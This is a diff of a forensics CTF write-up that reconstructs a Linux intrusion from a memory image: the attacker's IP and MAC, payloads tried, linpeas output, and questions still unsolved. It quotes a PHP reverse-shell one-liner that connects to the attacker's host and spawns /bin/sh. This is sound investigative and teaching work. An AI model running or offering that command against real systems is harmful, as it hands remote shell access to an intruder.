@@ -39,7 +39,7 @@ eth0             192.168.1.136        08:00:27:cc:dd:e0  True
 ```
 ### Q4. What is the MAC address of the attacker machine?
 
-```linux_arp``` gives the ARP cache. Considering the addresses where on the same network, we found the right binding:
+```linux_arp``` gives the ARP cache. Considering the addresses were on the same network, we found the right binding:
 ```
 [192.168.1.194                             ] at 38:14:28:0b:12:de    on eth0
 ```
@@ -63,13 +63,13 @@ php -r '$sock=fsockopen("192.168.1.194",12035);exec("/bin/sh -i <&3 >&3 2>&3");'
 ```
 The second command was successful, the first one was not.
 
-### Q7. What other payload did the attacker try, but was unsuccesful?
+### Q7. What other payload did the attacker try, but was unsuccessful?
 
 See Q6 for the answer.
 
 ### Q8. What is the password of the unprivileged account?
 
-In /var/auth.log, I saw a reference to PWD=/run/shm, so I checked that folder and found some interesting scripts anf files:                                                                
+In /var/auth.log, I saw a reference to PWD=/run/shm, so I checked that folder and found some interesting scripts and files:                                                                
 
 ```
 0xffff88007b2dfa98                      7267 /run/shm
@@ -117,7 +117,9 @@ See Q6 for the answer.
 
 ### Q15. What is the address of the exploit used by the attacker?
 
+While looking through /run/smh again, I figured out that linpeas.out was run as www-data, before logging into carl with the password (found from linpeas ouput), while the linpeas2.out was run as carl, looking for a way to escalate. Therefore there are differences in output (ran diff on them).
 
+-will solve in the future-
 
 ### Q16. What is the PID of the root shell?
 
@@ -141,6 +143,8 @@ Plus, 18943 is PPID for it and tcpdump was being run as root already. And 18943 
 See Q6 for that answer.
 
 ### Q18. What is the full time of the moment when the attacker elevated his privileges to root?
+
+-still trying harder-
 
 ### Q19. The attacker exfiltrated some information from the root user. What is this information about? Format: CTF{sha256}.
 
